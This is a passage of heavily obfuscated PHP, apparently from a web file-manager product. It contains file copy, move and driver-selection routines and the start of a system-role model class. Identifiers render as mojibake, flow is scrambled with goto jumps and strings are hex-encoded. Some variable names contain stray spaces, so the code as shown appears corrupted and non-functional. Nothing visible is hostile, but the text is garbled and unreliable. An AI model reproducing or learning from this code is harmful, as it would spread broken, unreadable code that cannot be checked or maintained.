$f…¥‡œÌĞ²->pathParse[$d¹™ÖõÚÏ¸[988]]; $D¸á²Â¸íå = $f…¥‡œÌĞ²; $f…¥‡œÌĞ² = self::driverMake($bƒˆÒ Íò); } goto déº„±¢ä; dÌ÷±æà›Ê: $d¹™ÖõÚÏ¸ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dâ³§¥ÜÖÊ = self::info($A„Ş˜‹’ÎŒ); $C¼¸êÓß¢õ = self::driverMake($AÀ™¥§Àƒ); goto Eğø¿ë±Œ; déº„±¢ä: $cÆ×ÏÙ¿–… = $f…¥‡œÌĞ²->pathFather($A„Ş˜‹’ÎŒ); $A‚¢¾ßãµØ = !0; if (!$B²›¾—ê && self::driverIsSame($C¼¸êÓß¢õ, $f…¥‡œÌĞ²)) { $A‚¢¾ßãµØ = !1; } goto a¬ğ°‡Æ·; a¬ğ°‡Æ·: $E‹ˆÖÉÎ£° = self::copyFile($C¼¸êÓß¢õ, $AÀ™¥§Àƒ, $f…¥‡œÌĞ², $cÆ×ÏÙ¿–…, $dâ³§¥ÜÖÊ[$d¹™ÖõÚÏ¸[28]], $A‚¢¾ßãµØ); if ($D¸á²Â¸íå) { $E‹ˆÖÉÎ£° = $D¸á²Â¸íå->getPathOuter($E‹ˆÖÉÎ£°); } return $E‹ˆÖÉÎ£°; goto a’Ö¥…†; a’Ö¥…†: } private static function copyMove($FÅƒÜò‘”, $e‡çŠ‹¼Ë , $dÖ½Ô‹İÜß, $CÂÔÒä«õØ, $aâîÌ¤«„ = false) { goto A¨†„©®â; A¨†„©®â: $Fá£¬ŸÛåÔ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$FÅƒÜò‘” || $FÅƒÜò‘” == $Fá£¬ŸÛåÔ[8] || !$e‡çŠ‹¼Ë ) { return !1; } ignore_timeout(); goto B¸×ß ¦˜; DµöÅÀ¿Š: if ($cíé§ŒµÆµ) { $c‰ÚÅèÍ¶ğ = $cíé§ŒµÆµ->getPathOuter($c‰ÚÅèÍ¶ğ); } return $c‰ÚÅèÍ¶ğ; goto C”‰æ¾¯’; CñˆÕ“£Ù: Hook::trigger($Fá£¬ŸÛåÔ[72], $açê²Â³‡, $FÅƒÜò‘”, $B¢î÷Ãó”, $e‡çŠ‹¼Ë ); $Bó³½‹­‚ì = self::driverIsSame($açê²Â³‡, $B¢î÷Ãó”); if ($Bó³½‹­‚ì) { if ($CÂÔÒä«õØ == $Fá£¬ŸÛåÔ[496] && trim($e‡çŠ‹¼Ë , $Fá£¬ŸÛåÔ[8]) == trim($B¢î÷Ãó”->pathFather($FÅƒÜò‘”), $Fá£¬ŸÛåÔ[8])) { return $B¢î÷Ãó”->getPathOuter($FÅƒÜò‘”); } if (method_exists($B¢î÷Ãó”, $CÂÔÒä«õØ)) { return $B¢î÷Ãó”->{$CÂÔÒä«õØ}($FÅƒÜò‘”, $e‡çŠ‹¼Ë , $dÖ½Ô‹İÜß); } } goto F³Ì½Æˆõ; B¸×ß ¦˜: $açê²Â³‡ = self::driverMake($FÅƒÜò‘”); $B¢î÷Ãó” = self::driverMake($e‡çŠ‹¼Ë ); $b³®š”¿ò± = $CÂÔÒä«õØ == $Fá£¬ŸÛåÔ[496]; goto b‡â›÷òùÉ; F³Ì½Æˆõ: $DÌË»†™¾Ë = $açê²Â³‡->isFile($FÅƒÜò‘”); if (!$DÌË»†™¾Ë && $B¢î÷Ãó”->getType() == $Fá£¬ŸÛåÔ[691] && $açê²Â³‡->getType() == $Fá£¬ŸÛåÔ[101]) { $c‰ÚÅèÍ¶ğ = $B¢î÷Ãó”->copyFolderFromIO($açê²Â³‡, $FÅƒÜò‘”, $e‡çŠ‹¼Ë , $dÖ½Ô‹İÜß, $b³®š”¿ò±, $aâîÌ¤«„); } else { $c‰ÚÅèÍ¶ğ = self::copyPath($açê²Â³‡, $FÅƒÜò‘”, $B¢î÷Ãó”, $e‡çŠ‹¼Ë , $dÖ½Ô‹İÜß, $b³®š”¿ò±, $DÌË»†™¾Ë, $aâîÌ¤«„); } if ($c‰ÚÅèÍ¶ğ && $b³®š”¿ò±) { $açê²Â³‡->remove($FÅƒÜò‘”); } goto DµöÅÀ¿Š; b‡â›÷òùÉ: $cíé§ŒµÆµ = !1; if ($B¢î÷Ãó”->pathParse[$Fá£¬ŸÛåÔ[988]]) { $e‡çŠ‹¼Ë  = $B¢î÷Ãó”->pathParse[$Fá£¬ŸÛåÔ[988]]; $cíé§ŒµÆµ = $B¢î÷Ãó”; $B¢î÷Ãó” = self::driverMake($e‡çŠ‹¼Ë ); } self::check($açê²Â³‡, $FÅƒÜò‘”, $B¢î÷Ãó”, $e‡çŠ‹¼Ë ); goto CñˆÕ“£Ù; C”‰æ¾¯’: } private static function check($BØµÒ¨Áó¸, $aÚÒê¶¼ğ•, $CÏÍ¾¶·¿Š, &$dĞšñÕ‚ãŠ) { $b¥­‘Ö¡Ÿ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (self::driverIsSame($BØµÒ¨Áó¸, $CÏÍ¾¶·¿Š) && $BØµÒ¨Áó¸->isFolder($aÚÒê¶¼ğ•) && $BØµÒ¨Áó¸->isParentOf($aÚÒê¶¼ğ•, $dĞšñÕ‚ãŠ)) { show_json(LNG($b¥­‘Ö¡Ÿ[989]), !1); } if (!$BØµÒ¨Áó¸->exist($aÚÒê¶¼ğ•)) { show_json(LNG($b¥­‘Ö¡Ÿ[100]), !1); } } private static function copyPath($BòöÃî±«¸, $FÂá«½ªâÚ, $aÇ“®‹Í™„, $B˜…í‚¯, $CõñøÎ†, $Cğ¼•œƒË, $FóÍæËÍˆ¥, $dê£êÃÔ  = false) { goto F—ùëª®Íê; EçÄ‘Œ¢¢: $d±‰àñ–â¦ = array_merge($e–Ğ¿»òÍ®[$E¹»¨è‘‡¤[73]], $e–Ğ¿»òÍ®[$E¹»¨è‘‡¤[74]]); foreach ($d±‰àñ–â¦ as $f°æß‘³Í) { $E‹çÜ†ÁÙ = $f°æß‘³Í[$E¹»¨è‘‡¤[29]] == $E¹»¨è‘‡¤[163]; $FÂá«½ªâÚ = $BòöÃî±«¸->getPathInner($f°æß‘³Í[$E¹»¨è‘‡¤[75]]); $B‹’ƒÎÕª = self::copyPath($BòöÃî±«¸, $FÂá«½ªâÚ, $aÇ“®‹Í™„, $B˜…í‚¯, $CõñøÎ†, $Cğ¼•œƒË, $E‹çÜ†ÁÙ); if (!$B‹’ƒÎÕª) { write_log($E¹»¨è‘‡¤[990] . $FÂá«½ªâÚ . $E¹»¨è‘‡¤[991] . $B˜…í‚¯, $E¹»¨è‘‡¤[992]); } } return $föĞÑ¦‰¥¦; goto a¬‹Å×÷¸†; F—ùëª®Íê: $E¹»¨è‘‡¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f«¾†“¯™³ = $dê£êÃÔ  ? $dê£êÃÔ  : $BòöÃî±«¸->getPathName($BòöÃî±«¸->pathThis($FÂá«½ªâÚ)); if ($CõñøÎ†) { $EÉ‰¹ÂÀæñ = $aÇ“®‹Í™„->fileNameExist($B˜…í‚¯, $f«¾†“¯™³); $f«¾†“¯™³ = $aÇ“®‹Í™„->fileNameAuto($B˜…í‚¯, $f«¾†“¯™³, $CõñøÎ†, !$FóÍæËÍˆ¥); $CõñøÎ† = $EÉ‰¹ÂÀæñ ? $CõñøÎ† : !1; } goto eÙ©ø‰¥Çƒ; AÎ‚øçğ‡È: $föĞÑ¦‰¥¦ = $aÇ“®‹Í™„->mkdir($aÇ“®‹Í™„->getPath($B«“ÇˆÍÒË)); $B˜…í‚¯ = $aÇ“®‹Í™„->getPathInner($föĞÑ¦‰¥¦); $e–Ğ¿»òÍ® = $BòöÃî±«¸->listPath($FÂá«½ªâÚ, !0); goto EçÄ‘Œ¢¢; eÙ©ø‰¥Çƒ: if ($FóÍæËÍˆ¥) { return self::copyFile($BòöÃî±«¸, $FÂá«½ªâÚ, $aÇ“®‹Í™„, $B˜…í‚¯, $f«¾†“¯™³, $Cğ¼•œƒË); } if ($CõñøÎ† == REPEAT_RENAME_FOLDER) { $CõñøÎ† = !1; } $B«“ÇˆÍÒË = rtrim($B˜…í‚¯, $E¹»¨è‘‡¤[8]) . $E¹»¨è‘‡¤[8] . $f«¾†“¯™³; goto AÎ‚øçğ‡È; a¬‹Å×÷¸†: } private static function copyFile($DÒ¨êŠÓ‰Å, $c¿ÏÇì”ùô, $A»Óõ‰´éò, $cˆò½ğŸê, $D¾±ÜâÌ¹Ì, $f¢°£‚Ê’£) { goto c¹¨¼ÁÌÜ‚; cùê××…Í“: mk_dir($a¯œÇÁ›¡“); $eŠá–°Éô = $a¯œÇÁ›¡“ . $AÌ°¼Äö„ ; $eŠá–°Éô = $DÒ¨êŠÓ‰Å->download($c¿ÏÇì”ùô, $eŠá–°Éô); goto dŒôë‘í¡÷; EöºˆÕß¼: Hook::trigger($d¿ÄÅĞ¤¾[994], $DÒ¨êŠÓ‰Å, $c¿ÏÇì”ùô, $A»Óõ‰´éò, $cˆò½ğŸê, $D¾±ÜâÌ¹Ì, $AÌ°¼Äö„ ); if (self::driverIsSame($DÒ¨êŠÓ‰Å, $A»Óõ‰´éò)) { if ($f¢°£‚Ê’£) { $e’­Ô½İ¤¿ = $A»Óõ‰´éò->moveFile($c¿ÏÇì”ùô, $cˆò½ğŸê); } else { $e’­Ô½İ¤¿ = $A»Óõ‰´éò->copyFile($c¿ÏÇì”ùô, $cˆò½ğŸê); } Hook::trigger($d¿ÄÅĞ¤¾[995], $DÒ¨êŠÓ‰Å, $c¿ÏÇì”ùô, $A»Óõ‰´éò, $cˆò½ğŸê, $D¾±ÜâÌ¹Ì, $e’­Ô½İ¤¿); return $e’­Ô½İ¤¿; } $a¯œÇÁ›¡“ = TEMP_FILES; goto cùê××…Í“; dŒôë‘í¡÷: $eŠá–°Éô = $DÒ¨êŠÓ‰Å->iconvApp($eŠá–°Éô); $e’­Ô½İ¤¿ = $A»Óõ‰´éò->upload($cˆò½ğŸê, $eŠá–°Éô, $f¢°£‚Ê’£); self::remove($a¯œÇÁ›¡“ . $AÌ°¼Äö„ ); goto b”åÀÆèÚ‹; b”åÀÆèÚ‹: Hook::trigger($d¿ÄÅĞ¤¾[995], $DÒ¨êŠÓ‰Å, $c¿ÏÇì”ùô, $A»Óõ‰´éò, $cˆò½ğŸê, $D¾±ÜâÌ¹Ì, $e’­Ô½İ¤¿); return $e’­Ô½İ¤¿; goto bñí‚–êß¾; c¹¨¼ÁÌÜ‚: $d¿ÄÅĞ¤¾ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cˆò½ğŸê = $A»Óõ‰´éò->getPath(rtrim($cˆò½ğŸê, $d¿ÄÅĞ¤¾[8]) . $d¿ÄÅĞ¤¾[8] . $D¾±ÜâÌ¹Ì); $AÌ°¼Äö„  = $d¿ÄÅĞ¤¾[993] . time() . rand_string(5); goto EöºˆÕß¼; bñí‚–êß¾: } public static function pathFather($AÕäëñÄç°) { $EµÕµ¥ñàá = IO::init($AÕäëñÄç°); $fƒĞ¹Ù‘âö = $EµÕµ¥ñàá->pathFather($EµÕµ¥ñàá->path); return $EµÕµ¥ñàá->getPathOuter($fƒĞ¹Ù‘âö); } public static function fileOut($CåŞŠŒÚÍÂ, $b°½¤¶ß’Ÿ = false, $EŒŸ§õØ„£ = false, $cç¯‰»™¸ˆ = '') { $CÔÕ¬¡õáø = self::driverMake($CåŞŠŒÚÍÂ); if ($CÔÕ¬¡õáø->isFileOutServer()) { return $CÔÕ¬¡õáø->fileOutServer($CåŞŠŒÚÍÂ, $b°½¤¶ß’Ÿ, $EŒŸ§õØ„£, $cç¯‰»™¸ˆ); } return $CÔÕ¬¡õáø->fileOut($CåŞŠŒÚÍÂ, $b°½¤¶ß’Ÿ, $EŒŸ§õØ„£, $cç¯‰»™¸ˆ); } public static function fileOutImage($e›ßÉÕßå½, $aš­ÃÀ×·Ş = 250) { $Aó¾¯»œ½ = array(250, 600, 1200, 3000); for ($B¶Š‹„Èİ = 0; $B¶Š‹„Èİ < count($Aó¾¯»œ½); $B¶Š‹„Èİ++) { if ($B¶Š‹„Èİ == 0 && $aš­ÃÀ×·Ş <= $Aó¾¯»œ½[$B¶Š‹„Èİ]) { $aš­ÃÀ×·Ş = $Aó¾¯»œ½[$B¶Š‹„Èİ]; break; } else { if ($aš­ÃÀ×·Ş > $Aó¾¯»œ½[$B¶Š‹„Èİ - 1] && $aš­ÃÀ×·Ş <= $Aó¾¯»œ½[$B¶Š‹„Èİ]) { $aš­ÃÀ×·Ş = $Aó¾¯»œ½[$B¶Š‹„Èİ]; break; } else { if ($B¶Š‹„Èİ == count($Aó¾¯»œ½) - 1 && $aš­ÃÀ×·Ş > $Aó¾¯»œ½[$B¶Š‹„Èİ]) { $aš­ÃÀ×·Ş = $Aó¾¯»œ½[$B¶Š‹„Èİ]; break; } } } } $FÄ°İ´Ş† = self::driverMake($e›ßÉÕßå½); if ($FÄ°İ´Ş†->isFileOutServer()) { return $FÄ°İ´Ş†->fileOutImageServer($e›ßÉÕßå½, $aš­ÃÀ×·Ş); } return $FÄ°İ´Ş†->fileOutImage($e›ßÉÕßå½, $aš­ÃÀ×·Ş); } private static function driverIsSame($cï¸à÷ï Õ, $Fó©Ü¹¬) { goto BãÑß’ÄÎ; e—õßƒÇ¬ö: if ($eì£‰õÎó¢ != $bÂÌÏËŠ°) { return !1; } if ($eì£‰õÎó¢ == $EõŞáŠÏã[691]) { return !0; } if ($eì£‰õÎó¢ == $EõŞáŠÏã[101]) { return !0; } goto aÁ‰½ĞÛë; aÁ‰½ĞÛë: if ($cï¸à÷ï Õ->pathDriver == $Fó©Ü¹¬->pathDriver) { return !0; } return !1; goto c÷‡šš’›â; BãÑß’ÄÎ: $EõŞáŠÏã =& $_SERVER[ºÖÙÂŒäÉê‡]; $eì£‰õÎó¢ = $cï¸à÷ï Õ->getType(); $bÂÌÏËŠ° = $Fó©Ü¹¬->getType(); goto e—õßƒÇ¬ö; c÷‡šš’›â: } public static function copyUpdate($F¿õÚÅˆ³¶, $Aå Ş¶‡å©) { goto céíÁ–‹; céíÁ–‹: $B¿É„ì—‹• =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!IO::exist($F¿õÚÅˆ³¶)) { return !1; } if (!IO::exist($Aå Ş¶‡å©)) { IO::mkdir($Aå Ş¶‡å©); } goto FÃ–¢—øÚ; FÃ–¢—øÚ: $B­³­¢—Êí = self::_listAll($F¿õÚÅˆ³¶); $eà¸ÙŠÛ‰å = self::_listAll($Aå Ş¶‡å©); $eÑœ´áÜ°Ğ = array(); goto dŠù¦²‘’æ; dŠù¦²‘’æ: $BçÎÅã¤ = array(); foreach ($B­³­¢—Êí as $FÆšç¶ ­È => $bëäªğÎê…) { if (isset($eà¸ÙŠÛ‰å[$FÆšç¶ ­È])) { if ($bëäªğÎê…[$B¿É„ì—‹•[76]] == 1) { continue; } if ($eà¸ÙŠÛ‰å[$FÆšç¶ ­È][$B¿É„ì—‹•[77]] == $bëäªğÎê…[$B¿É„ì—‹•[77]]) { continue; } } if ($bëäªğÎê…[$B¿É„ì—‹•[76]] == 1) { $BçÎÅã¤[] = $Aå Ş¶‡å© . $B¿É„ì—‹•[8] . $FÆšç¶ ­È; continue; } $C‰‰±ÌÔõ = strstr(trim($FÆšç¶ ­È, $B¿É„ì—‹•[8]), $B¿É„ì—‹•[8]) ? get_path_father($FÆšç¶ ­È) : $B¿É„ì—‹•[33]; $eÑœ´áÜ°Ğ[] = array($B¿É„ì—‹•[996] => $bëäªğÎê…[$B¿É„ì—‹•[75]], $B¿É„ì—‹•[997] => rtrim($Aå Ş¶‡å©, $B¿É„ì—‹•[8]) . $B¿É„ì—‹•[8] . $C‰‰±ÌÔõ, $B¿É„ì—‹•[998] => $bëäªğÎê…); } $dºšÇ«†¶Ã = array($B¿É„ì—‹•[163] => $eÑœ´áÜ°Ğ, $B¿É„ì—‹•[76] => $BçÎÅã¤); goto A®ĞÏ³Ÿ†‚; A®ĞÏ³Ÿ†‚: Hook::trigger($B¿É„ì—‹•[999], $F¿õÚÅˆ³¶, $Aå Ş¶‡å©, $dºšÇ«†¶Ã); foreach ($BçÎÅã¤ as $bëäªğÎê…) { IO::mkdir($bëäªğÎê…); } foreach ($eÑœ´áÜ°Ğ as $bëäªğÎê…) { IO::copy($bëäªğÎê…[$B¿É„ì—‹•[996]], $bëäªğÎê…[$B¿É„ì—‹•[997]], REPEAT_REPLACE); } goto DËœÉ¦¶•·; DËœÉ¦¶•·: } private static function _listAll($Fİ£š’¦½) { $EÆá—Š¾¥¦ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Fİ£š’¦½ = KodIO::clear($Fİ£š’¦½); $bğÏéãê¡‹ = IO::listAll($Fİ£š’¦½); foreach ($bğÏéãê¡‹ as &$fÕ‚“ ñßÃ) { $fº°ø‹¿Îâ = substr($fÕ‚“ ñßÃ[$EÆá—Š¾¥¦[75]], strlen($Fİ£š’¦½)); $fÕ‚“ ñßÃ[$EÆá—Š¾¥¦[1000]] = trim($fº°ø‹¿Îâ, $EÆá—Š¾¥¦[8]); } return array_to_keyvalue($bğÏéãê¡‹, $EÆá—Š¾¥¦[1000]); } public static function fileSubstr($Càšé†Ú‹†, $b—èº’†, $bÜÉ­ÅÜŠÒ = false) { goto eß™ëáïŒ; f¡¯öäÒ±: if ($b—èº’† + $bÜÉ­ÅÜŠÒ > $E ™…ç…§¤) { $bÜÉ­ÅÜŠÒ = $E ™…ç…§¤ - $b—èº’†; } if ($bÜÉ­ÅÜŠÒ <= 0) { return $_SERVER[ºÖÙÂŒäÉê‡][33]; } if ($b—èº’† < 0 || $b—èº’† >= $E ™…ç…§¤ || $bÜÉ­ÅÜŠÒ > 1024 * 1024 * 5) { throw new Exception("\x66\x69\154\145\x52\145\x61\x64\40\x65\162\x72\x6f\x72\41\40\x73\164\141\x72\x74\x3d{$b—èº’†}\73\154\x65\156\x67\x74\x68\75{$bÜÉ­ÅÜŠÒ}\x3b\x20\x73\151\172\145\x3d{$E ™…ç…§¤}\x3b"); } goto B‡‡’òëÜ; eß™ëáïŒ: $bÇÙ¾óºµÃ = self::driverMake($Càšé†Ú‹†); $E ™…ç…§¤ = $bÇÙ¾óºµÃ->size($Càšé†Ú‹†); $FƒøºËÚÈ‘ = $b—èº’†; goto F¹ùêŒ÷Ş…; B‡‡’òëÜ: return $bÇÙ¾óºµÃ->fileSubstr($Càšé†Ú‹†, $b—èº’†, $bÜÉ­ÅÜŠÒ); goto a»ØºèÙ•ğ; F¹ùêŒ÷Ş…: $F¥°šê¸ùö = $bÜÉ­ÅÜŠÒ; if ($b—èº’† < 0) { $b—èº’† = $E ™…ç…§¤ + $b—èº’†; } if ($bÜÉ­ÅÜŠÒ === !1) { $bÜÉ­ÅÜŠÒ = $E ™…ç…§¤ - $b—èº’†; } goto f¡¯öäÒ±; a»ØºèÙ•ğ: } private static function driverMake(&$dÈÁ´Ãù½Æ) { goto DÓÄ¬Î·õ„; DÓÄ¬Î·õ„: $b»Í®…® =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÌÎÈÕ„¢Ÿ = KodIO::parse($dÈÁ´Ãù½Æ); if (!self::$driverListSystem) { $Bå·Ş“¹ÄÛ = Model($b»Í®…®[701])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Bå·Ş“¹ÄÛ, $b»Í®…®[372]); } goto CÖ–ğÑ’óõ; CÖ–ğÑ’óõ: if ($aÌÎÈÕ„¢Ÿ[$b»Í®…®[29]] == KodIO::KOD_IO && !self::$driverListSystem[$aÌÎÈÕ„¢Ÿ[$b»Í®…®[372]]]) { return !1; } $dÈÁ´Ãù½Æ = $aÌÎÈÕ„¢Ÿ[$b»Í®…®[1001]]; $cóÉäÍñà = self::driverGet($aÌÎÈÕ„¢Ÿ, $dÈÁ´Ãù½Æ); goto BÒÎã¸; BÒÎã¸: return $cóÉäÍñà; goto A—Ÿ˜ƒ˜•ß; A—Ÿ˜ƒ˜•ß: } private static function driverGet($c¼ÌÓÔ»¡‚, &$a£Å¥™£Ÿá) { goto E“„íƒù©È; fÁ×½ƒ¾ãÆ: if (isset($b§íÀ³­õ[$dª´Âìƒ¸[6]][$dª´Âìƒ¸[1014]])) { $bù’µ»ŠŠ…->pathBase = rtrim($b§íÀ³­õ[$dª´Âìƒ¸[6]][$dª´Âìƒ¸[1014]], $dª´Âìƒ¸[8]) . $dª´Âìƒ¸[8]; $a£Å¥™£Ÿá = $bù’µ»ŠŠ…->pathBase . ltrim($a£Å¥™£Ÿá, $dª´Âìƒ¸[8]); } $a£Å¥™£Ÿá = $bù’µ»ŠŠ…->getPath($a£Å¥™£Ÿá); if (isset($c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[988]])) { $a£Å¥™£Ÿá = $c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[988]]; } goto a· Ñ÷…¦; a· Ñ÷…¦: $bù’µ»ŠŠ…->path = $a£Å¥™£Ÿá; return $bù’µ»ŠŠ…; goto f™˜ÃíÂßÄ; E“„íƒù©È: $dª´Âìƒ¸ =& $_SERVER[ºÖÙÂŒäÉê‡]; $a³ØƒÒĞ‰¦ = $c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[1002]]; $A»Û®ßÉ¦Õ = $c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[372]]; goto D´–ù¾âå; DˆÙ¤Ü¯¤: $bù’µ»ŠŠ… = self::$driverCache[$FõÓè ßŠß]; $bù’µ»ŠŠ…->pathDriver = $a³ØƒÒĞ‰¦; $bù’µ»ŠŠ…->pathBase = $dª´Âìƒ¸[33]; goto fÁ×½ƒ¾ãÆ; D´–ù¾âå: switch ($c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[29]]) { case KodIO::KOD_IO: $b§íÀ³­õ = self::$driverListSystem[$A»Û®ßÉ¦Õ]; break; case KodIO::KOD_SOURCE: $a£Å¥™£Ÿá = $A»Û®ßÉ¦Õ . $a£Å¥™£Ÿá; $b§íÀ³­õ = array($dª´Âìƒ¸[1003] => $dª´Âìƒ¸[1004], $dª´Âìƒ¸[6] => $c¼ÌÓÔ»¡‚); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Aé«í¬ÍÜˆ = $GLOBALS[$dª´Âìƒ¸[1005]]; self::$driverListUser = array_to_keyvalue($Aé«í¬ÍÜˆ, $dª´Âìƒ¸[372]); } $b§íÀ³­õ = self::$driverListUser[$A»Û®ßÉ¦Õ]; break; case KodIO::KOD_SHARE_LINK: $b§íÀ³­õ = array($dª´Âìƒ¸[1003] => $dª´Âìƒ¸[1006], $dª´Âìƒ¸[6] => $c¼ÌÓÔ»¡‚); $F±†‰»ë“ò = Action($dª´Âìƒ¸[1007])->sharePathInfo($c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[75]]); $a£Å¥™£Ÿá = $F±†‰»ë“ò[$dª´Âìƒ¸[374]]; if (!$F±†‰»ë“ò[$dª´Âìƒ¸[374]]) { $DøŠÎ˜×ª” = Model($dª´Âìƒ¸[540])->getInfo($F±†‰»ë“ò[$dª´Âìƒ¸[445]]); $a£Å¥™£Ÿá = KodIO::clear($DøŠÎ˜×ª”[$dª´Âìƒ¸[1008]] . $c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[1001]]); $c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[443]] = $DøŠÎ˜×ª”; $c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[988]] = $a£Å¥™£Ÿá; $b§íÀ³­õ = array($dª´Âìƒ¸[1003] => $dª´Âìƒ¸[1009], $dª´Âìƒ¸[6] => $c¼ÌÓÔ»¡‚); } break; case KodIO::KOD_SHARE_ITEM: $b§íÀ³­õ = array($dª´Âìƒ¸[1003] => $dª´Âìƒ¸[1010], $dª´Âìƒ¸[6] => $c¼ÌÓÔ»¡‚); $DøŠÎ˜×ª” = Model($dª´Âìƒ¸[540])->getInfo($c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[372]]); if ($DøŠÎ˜×ª”[$dª´Âìƒ¸[374]] == $dª´Âìƒ¸[472]) { $a£Å¥™£Ÿá = KodIO::clear($DøŠÎ˜×ª”[$dª´Âìƒ¸[1008]] . $c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[1001]]); $c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[443]] = $DøŠÎ˜×ª”; $c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[988]] = $a£Å¥™£Ÿá; $b§íÀ³­õ = array($dª´Âìƒ¸[1003] => $dª´Âìƒ¸[1011], $dª´Âìƒ¸[6] => $c¼ÌÓÔ»¡‚); } break; default: $a£Å¥™£Ÿá = $c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[75]]; $b§íÀ³­õ = array($dª´Âìƒ¸[1003] => $dª´Âìƒ¸[1012]); break; } $FõÓè ßŠß = $c¼ÌÓÔ»¡‚[$dª´Âìƒ¸[75]]; if (!isset(self::$driverCache[$FõÓè ßŠß])) { $e‰êÁÙ¾¶Ã = strtolower($b§íÀ³­õ[$dª´Âìƒ¸[90]]); $a„ó±àÎÎ• = $GLOBALS[$dª´Âìƒ¸[6]][$dª´Âìƒ¸[84]][$dª´Âìƒ¸[1013]]; $Aî‹›‹³Å = $dª´Âìƒ¸[71] . (isset($a„ó±àÎÎ•[$e‰êÁÙ¾¶Ã]) ? $a„ó±àÎÎ•[$e‰êÁÙ¾¶Ã] : ucfirst($e‰êÁÙ¾¶Ã)); if (!class_exists($Aî‹›‹³Å)) { show_json("{$Aî‹›‹³Å}\40\x6e\157\x74\x20\x65\170\x69\x73\164\x73\41", !1); } $DĞï¬‹ã‡Ä = isset($b§íÀ³­õ[$dª´Âìƒ¸[6]]) ? $b§íÀ³­õ[$dª´Âìƒ¸[6]] : !1; self::$driverCache[$FõÓè ßŠß] = new $Aî‹›‹³Å($DĞï¬‹ã‡Ä); } goto DˆÙ¤Ü¯¤; f™˜ÃíÂßÄ: } } goto A‡‡¥èĞ; c £àñ‚§Ì: define($_SERVER[ºÖÙÂŒäÉê‡][549], $_SERVER[ºÖÙÂŒäÉê‡][550]); $a¯”‹õ˜ø² = $_SERVER[ºÖÙÂŒäÉê‡][551]; if (!$a¯”‹õ˜ø²) { die; } goto c‹¼…ÎË”; aÑà˜µ‹Ï…: class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\162\157\x6c\x65\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\141\x75\164\150", "\154\x61\x62\x65\154", "\x64\x69\163\160\x6c\x61\171", "\163\171\x73\x74\x65\x6d", "\144\x65\x73\143", "\x69\147\x6e\157\162\145\x45\x78\164", "\151\x67\156\157\162\145\x46\x69\x6c\x65\x53\x69\172\145", "\141\144\155\151\156\x69\x73\164\162\141\164\157\x72", "\x73\157\x72\164"); public function listData($BÖ±Ë¬Ûö‚ = false, $bÍÅã½ğŞ« = "\x73\157\x72\x74", $añ“¢ÑšÊĞ = false) { return parent::listData($BÖ±Ë¬Ûö‚, $bÍÅã½ğŞ«, $añ“¢ÑšÊĞ); } public function update($b´Ô¥±Õ‰©, $cË–èÇ´š) { goto DÔ¹—×­Ğ£; AÚ¯ï¨‹Ì: if (!$e¶ é‘¶ö¶ || $D‡áø‚¸ô² && $D‡áø‚¸ô²[$b©œÜÙÓêö[372]] != $e¶ é‘¶ö¶[$b©œÜÙÓêö[372]]) { return !1; } if ($D‡áø‚¸ô²[$b©œÜÙÓêö[2435]] == 1) { $cË–èÇ´š = array($b©œÜÙÓêö[28] => $cË–èÇ´š[$b©œÜÙÓêö[28]], $b©œÜÙÓêö[2084] => $cË–èÇ´š[$b©œÜÙÓêö[2084]]); } $this->filterAuth($cË–èÇ´š[$b©œÜÙÓêö[381]]); goto B‚Ô‚Õ­µ¹; B‚Ô‚Õ­µ¹: return parent::update($b´Ô¥±Õ‰©, $cË–èÇ´š); goto b¬Ù‚¦‚Îá; DÔ¹—×­Ğ£: $b©œÜÙÓêö =& $_SERVER[ºÖÙÂŒäÉê‡]; $e¶ é‘¶ö¶ = parent::listData($b´Ô¥±Õ‰©); $D‡áø‚¸ô² = $this->findByName($cË–èÇ´š[$b©œÜÙÓêö[28]]); goto AÚ¯ï¨‹Ì; b¬Ù‚¦‚Îá: } public function remove($bÕ³¨—Œ“¨) { $eïÓ“âåÃâ = parent::listData($bÕ³¨—Œ“¨); if (!$eïÓ“âåÃâ || $eïÓ“âåÃâ[$_SERVER[ºÖÙÂŒäÉê‡][1070]]) { return !1; } return parent::remove($bÕ³¨—Œ“¨); } public function add($EÆ…ŞŞÉİ) { goto BŠó‘––î­; C ÊŠæôÒœ: $DÙÛ¡‰Ôºµ = array($EëØÁŞ•[391] => $DÜ¯¹œç‡õ, $EëØÁŞ•[2072] => $EëØÁŞ•[33], $EëØÁŞ•[2068] => $EëØÁŞ•[2085], $EëØÁŞ•[2436] => 1, $EëØÁŞ•[2071] => 0, $EëØÁŞ•[2437] => 0, $EëØÁŞ•[2070] => $this->getSort()); $EÆ…ŞŞÉİ = array_merge($DÙÛ¡‰Ôºµ, $EÆ…ŞŞÉİ); $this->filterAuth($EÆ…ŞŞÉİ[$EëØÁŞ•[381]]); goto c¿ÆÛ‘Ãó•; BŠó‘––î­: $EëØÁŞ• =& $_SERVER[ºÖÙÂŒäÉê‡]; $DÜ¯¹œç‡õ = $EÆ…ŞŞÉİ[$EëØÁŞ•[28]]; if ($this->findByName($DÜ¯¹œç‡õ)) { return !1; } goto C ÊŠæôÒœ; c¿ÆÛ‘Ãó•: return parent::insert($EÆ…ŞŞÉİ); goto a•¿¤ËŒâÂ; a•¿¤ËŒâÂ: } private function getSort() { $eÃ³Ê÷‰¨ =& 